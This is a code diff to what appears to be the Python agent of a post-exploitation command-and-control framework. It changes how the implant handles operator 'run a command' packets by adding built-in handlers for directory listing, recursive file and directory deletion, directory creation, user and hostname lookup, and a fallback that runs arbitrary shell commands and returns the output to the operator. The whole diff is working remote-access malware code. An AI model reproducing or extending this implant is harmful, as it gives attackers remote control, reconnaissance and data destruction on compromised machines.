@@ -17,6 +17,14 @@ import zipfile
 import io
 import imp
 import marshal
+import re
+import shutil
+import pwd
+import socket
+import math
+import stat
+import grp
+from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
@@ -258,10 +266,17 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 40:
         # run a command
-        resultData = str(run_command(data))
-        #Not sure why the line below is there.....
-        #e = build_response_packet(40, resultData, resultID)
-        return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+        parts = data.split(" ")
+        
+        if len(parts) == 1:
+            data = parts[0]
+            resultData = str(run_command(data))
+            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+        else:
+            cmd = parts[0]
+            cmdargs = ' '.join(parts[1:len(parts)])
+            resultData = str(run_command(cmd, cmdargs=cmdargs))
+            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
 
     elif packetType == 41:
         # file download
@@ -853,10 +868,98 @@ def data_webserver(data, ip, port, serveCount):
     httpServer.server_close()
     return
 
+def permissions_to_unix_name(st_mode):
+    permstr = ''
+    usertypes = ['USR', 'GRP', 'OTH']
+    for usertype in usertypes:
+        perm_types = ['R', 'W', 'X']
+        for permtype in perm_types:
+            perm = getattr(stat, 'S_I%s%s' % (permtype, usertype))
+            if st_mode & perm:
+                permstr += permtype.lower()
+            else:
+                permstr += '-'
+    return permstr
+
+def directory_listing(path):
+    # directory listings in python
+    # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html
+
+    res = ""
+    for fn in os.listdir(path):
+        fstat = os.stat(os.path.join(path, fn))
+        permstr = permissions_to_unix_name(fstat[0])
+
+        if os.path.isdir(fn):
+            permstr = "d{}".format(permstr)
+        else:
+            permstr = "-{}".format(permstr)
+
+        user = pwd.getpwuid(fstat.st_uid)[0]
+        group = grp.getgrgid(fstat.st_gid)[0]
+
+        # Convert file size to MB, KB or Bytes
+        if (fstat.st_size > 1024 * 1024):
+            fsize = math.ceil(fstat.st_size / (1024 * 1024))
+            unit = "MB"
+        elif (fstat.st_size > 1024):
+            fsize = math.ceil(fstat.st_size / 1024)
+            unit = "KB"
+        else:
+            fsize = fstat.st_size
+            unit = "B"
+
+        mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
+
+        res += '{} {} {} {:18s} {:f} {:2s} {:15.15s}\n'.format(permstr,user,group,mtime,fsize,unit,fn)
+
+    return res
+
 # additional implementation methods
-def run_command(command):
-    p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-    return p.communicate()[0].strip()
+def run_command(command, cmdargs=None):
+    
+    if re.compile("(ls|dir)").match(command):
+        if cmdargs == None or not os.path.exists(cmdargs):
+            cmdargs = '.'
+
+        return directory_listing(cmdargs)
+
+    elif re.compile("pwd").match(command):
+        return str(os.getcwd())
+    elif re.compile("rm").match(command):
+        if cmdargs == None:
+            return "please provide a file or directory"
+        
+        if os.path.exists(cmdargs):
+            if os.path.isfile(cmdargs):
+                os.remove(cmdargs)
+                return "done."
+            elif os.path.isdir(cmdargs):
+                shutil.rmtree(cmdargs)
+                return "done."
+            else:
+                return "unsupported file type"
+        else:
+            return "specified file/directory does not exist"
+    elif re.compile("mkdir").match(command):
+        if cmdargs == None:
+            return "please provide a directory"
+
+        os.mkdir(cmdargs)
+        return "Created directory: {}".format(cmdargs)
+
+    elif re.compile("(whoami|getuid)").match(command):
+        return pwd.getpwuid(os.getuid())[0]
+
+    elif re.compile("hostname").match(command):
+        return str(socket.gethostname())
+
+    else:
+        if cmdargs != None:
+            command = "{} {}".format(command,cmdargs)
+        
+        p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+        return p.communicate()[0].strip()
 
 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
